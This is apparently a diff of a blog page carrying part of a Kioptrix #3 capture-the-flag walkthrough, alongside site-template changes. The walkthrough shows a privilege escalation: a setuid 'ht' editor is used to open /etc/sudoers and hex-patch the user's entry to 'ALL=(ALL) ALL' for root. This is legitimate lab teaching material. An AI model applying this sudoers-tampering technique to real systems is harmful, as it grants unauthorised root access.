-<p>Even though we shouldn't have permission to read the sudoers file, using the setuid / setgid ht executable, we are able to load the file.<br>
-<img src="https://blog.rootshellz.com/content/images/2017/09/ht-sudoers-before.png" alt="ht-sudoers-before"></p>
+<p>Even though we shouldn't have permission to read the sudoers file, using the setuid / setgid ht executable, we are able to load the file.<br />
+</p>
 <p>Now let's do some hex patching.  We want to change</p>
 <pre><code class="language-hexdump">│00000130 65 66 65 72 72 65 74 20-41 4c 4c 3d 4e 4f 50 41 |eferret ALL=NOPA|│
 │00000140 53 53 57 44 3a 20 21 2f-75 73 72 2f 62 69 6e 2f |SSWD: !/usr/bin/|│
@@ -856,11 +1383,11 @@ loneferret@Kioptrix3:~$ ht /etc/sudoers
 │00000150 73 75 2c 20 2f 75 73 72-2f 6c 6f 63 61 6c 2f 62 |su, /usr/local/b|│
 │00000160 69 6e 2f 68 74 0a 0a 23-20 55 6e 63 6f 6d 6d 65 |in/ht??# Uncomme|│
 </code></pre>
-<p><code>loneferret ALL=(ALL) ALL</code><br>
+<p><code>loneferret ALL=(ALL) ALL</code><br />
 <code>#/usr/bin/su, /usr/local/bin/ht</code></p>
 <p>This will effectively give us full, root access to the target, as we will be able to run any command as root using sudo.</p>
-<p>Let's make the change and save the file using ht:<br>
-<img src="https://blog.rootshellz.com/content/images/2017/09/ht-sudoers-after.png" alt="ht-sudoers-after"></p>
+<p>Let's make the change and save the file using ht:<br />
+</p>
 <p>After saving the file, let's see if we win:</p>
 <pre><code class="language-shell-output">loneferret@Kioptrix3:~$ sudo -l
 [sudo] password for loneferret: 
@@ -937,63 +1464,32 @@ starwars
 </code></pre>
 <p>This just goes to show, both on challenge VMs and real world servers, there is usually more than one way to pop the box.</p>
 <p>Until next time, stay root my friends!</p>
-<!--kg-card-end: markdown-->
-        </section>
-        
-        <div id="disqus_thread"></div>
-        <script type="text/javascript">
-            var disqus_shortname = d_id; 
-        
-            /* * * DON'T EDIT BELOW THIS LINE * * */
-            (function() {
-                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-            })();
-        </script>
-        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        
-
-        <footer class="post-footer">
 
 
-            <section class="share">
-                <h4>Share this</h4>
-                <a class="icon-twitter" href="http://twitter.com/share?text=Kioptrix: Level 1.2 (#3) Walkthrough&url=https://blog.rootshellz.com/kioptrix-walkthrough-3/"
-                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-                    <span class="hidden">Twitter</span>
-                </a>
-                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.rootshellz.com/kioptrix-walkthrough-3/"
-                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-                    <span class="hidden">Facebook</span>
-                </a>
-                <a class="icon-google-plus" href="https://plus.google.com/share?url=https://blog.rootshellz.com/kioptrix-walkthrough-3/"
-                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-                    <span class="hidden">Google+</span>
-                </a>
             </section>
 
-        </footer>
-
-
-    </article>
-
-</main>
-
-
-    <footer class="site-footer">
-        <!-- <a class="subscribe icon-feed" href="https://blog.rootshellz.com/rss/"><span class="tooltip">Subscribe!</span></a> -->
-        <div class="inner">
-             <section class="copyright">All content copyright <a href="/">rootshellz</a> &copy; 2020 &bull; All rights reserved.</section>
-             <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://ghost.org"><span class="icon-ghost-text">Ghost</span></a> in <a href="https://github.com/mityalebedev/The-Shell">The Shell</a> theme.</section>
-        </div>
+        </article>
+    </main>
+    <footer class="page-footer">
+            <amp-img class="site-icon" src="https://blog.rootshellz.com/content/images/2020/11/Blog-Logo.png" width="50" height="50" layout="fixed"></amp-img>
+        <h3>rootshellz</h3>
+            <p>Drink all the booze hack all the things...</p>
+        <p><a href="https://blog.rootshellz.com">Read more posts →</a></p>
+        <a class="powered" href="https://ghost.org" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 156 156"><g fill="none" fill-rule="evenodd"><rect fill="#15212B" width="156" height="156" rx="27"/><g transform="translate(36 36)" fill="#F6F8FA"><path d="M0 71.007A4.004 4.004 0 014 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0130 84H4a4 4 0 01-4-4.007v-8.986zM50 71.007A4.004 4.004 0 0154 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0180 84H54a4 4 0 01-4-4.007v-8.986z"/><rect y="34" width="84" height="17" rx="4"/><path d="M0 4.007A4.007 4.007 0 014.007 0h41.986A4.003 4.003 0 0150 4.007v8.986A4.007 4.007 0 0145.993 17H4.007A4.003 4.003 0 010 12.993V4.007z"/><rect x="67" width="17" height="17" rx="4"/></g></g></svg> Published with Ghost</a>
     </footer>
-
-    <!-- https://cdnjs.com/libraries/prism -->
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.22.0/prism.min.js"></script>
-
-    <script type='text/javascript' src="/assets/highlighter/prettify.js?v=8d33012fb0"></script>
-    <script type='text/javascript' src="/assets/js/shell.js?v=8d33012fb0"></script>
+    
+            <amp-analytics type="gtag" data-credentials="include">
+                <script type="application/json">
+                    {
+                        "vars" : {
+                            "gtag_id": "G-TM0JKQZ7H1",
+                            "config" : {
+                                "G-TM0JKQZ7H1": { "groups": "default" }
+                            }
+                        }
+                    }
+                </script>
+            </amp-analytics>
+        
 </body>
 </html>
